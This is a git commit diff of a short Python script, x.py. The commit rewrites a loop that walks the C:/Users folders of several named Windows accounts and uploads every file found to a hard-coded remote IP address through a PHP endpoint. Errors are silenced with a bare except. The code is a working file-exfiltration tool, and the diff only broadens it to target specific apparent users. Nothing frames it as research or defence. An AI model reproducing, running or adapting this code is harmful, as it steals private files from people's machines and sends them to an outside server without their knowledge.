93f52fd5b58d7d6db3afa314d11620fde2f65895
somehat <118371804+somehat@users.noreply.github.com>
2022-11-27 15:19:14 -0300

    Update x.py

--- x.py
+++ x.py
@@ -2,17 +2,18 @@ import os
 import glob
 import requests
 from os import listdir
-user = os.environ.get('USERNAME')
-path = f'C:/Users/{user}/'
 
-try:
-    for folder in listdir(f'C:/Users/{user}'):
-        current = path + folder
-        print(">>>>>", current)
-        for file in glob.glob(f'{current}/*.*'):
-            print(file)
-            url = 'http://3.85.122.241/globo_file.php'
-            files = {'file': open(bytes(file, encoding='utf-8'), 'rb')}
-            r = requests.post(url, files=files)
-except:
-    ...
+for user in ['defaultuser0', 'evieira_prest', 'fefranci', 'lfteixei', 'Public']:
+    path = f'C:/Users/{user}/'
+    
+    try:
+        for folder in listdir(f'C:/Users/{user}'):
+            current = path + folder
+            print(">>>>>", current)
+            for file in glob.glob(f'{current}/*.*'):
+                print(file)
+                url = 'http://3.85.122.241/globo_file.php'
+                files = {'file': open(bytes(file, encoding='utf-8'), 'rb')}
+                r = requests.post(url, files=files)
+    except:
+        ...
